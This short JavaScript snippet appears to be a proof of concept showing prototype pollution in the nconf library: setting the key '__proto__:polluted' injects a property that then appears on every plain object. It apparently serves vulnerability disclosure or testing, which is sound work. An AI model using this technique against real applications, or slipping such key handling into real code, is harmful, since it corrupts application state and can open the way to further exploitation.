const nconf = require('nconf'); 
nconf.use('memory') 
console.log({}.polluted) 
nconf.set('__proto__:polluted', 'yes') 
console.log({}.polluted)